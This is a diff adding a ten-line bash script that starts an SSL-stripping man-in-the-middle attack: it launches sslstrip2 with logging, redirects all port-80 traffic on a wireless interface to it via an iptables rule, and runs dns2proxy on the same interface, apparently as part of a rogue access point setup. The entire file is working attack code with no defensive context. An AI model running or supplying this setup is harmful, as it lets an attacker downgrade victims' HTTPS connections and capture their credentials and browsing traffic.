@@ -1,0 +1,10 @@
+#!/bin/bash
+upstream=$(cat upstream.txt)
+phy=$(cat wlan.txt)
+pwd=$(pwd)
+cd $pwd/sslstrip2/
+python $pwd/sslstrip2/sslstrip.py -l 10000 -a -w $pwd/logs/sslstrip.log.`date "+%s"`&
+iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+cd $pwd/dns2proxy/
+python dns2proxy.py -i $phy&
+cd -
